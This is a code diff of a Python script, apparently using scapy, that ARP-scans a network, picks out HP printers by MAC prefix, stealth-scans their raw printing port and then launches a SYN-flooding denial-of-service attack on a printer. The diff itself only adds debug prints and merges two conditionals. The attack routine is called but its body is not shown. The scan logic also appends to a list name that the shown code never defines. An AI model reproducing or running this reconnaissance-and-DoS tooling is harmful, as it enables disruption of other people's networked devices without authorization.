@@ -8,14 +8,16 @@ list_of_hp_printers = []
 
 
 def main():
-    your_network_ip_range = str(input("What is your ip range? "))
+    your_network_ip_range =  str(input("What is your ip range? "))
     # scan the network to create a list of hp printers
     global list_of_hp_printers
     list_of_hp_printers = arp_scan(your_network_ip_range)
+    print(list_of_hp_printers)
     # wait for arp request to a hp printer
     hp_printer_ip = wait_for_connection_attempt()
 
     # start dos attack (SYN Flooding Attack) on the printer
+    print("Starting Dos")
     dos_syn_flooding_attack(hp_printer_ip)
 
 
@@ -24,9 +26,8 @@ def arp_scan(ip_range):
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ip_range)), timeout=2)
 
     for sent, recived in ans:
-        if recived[ARP].hwsrc[0:8] == "9c:7b:ef":  # Hewlett Packard(HP) mac address
-            if stealth_scan(recived[ARP].psrc, RAW_PRINTING_PORT) == True:
-                list_of_printers.append(recived[ARP].psrc)
+        if recived[ARP].hwsrc[0:8] == "9c:7b:ef" and stealth_scan(recived[ARP].psrc, RAW_PRINTING_PORT): # Hewlett Packard(HP) mac address
+        	list_of_printers.append(recived[ARP].psrc)
     return list_of_printers
 
 
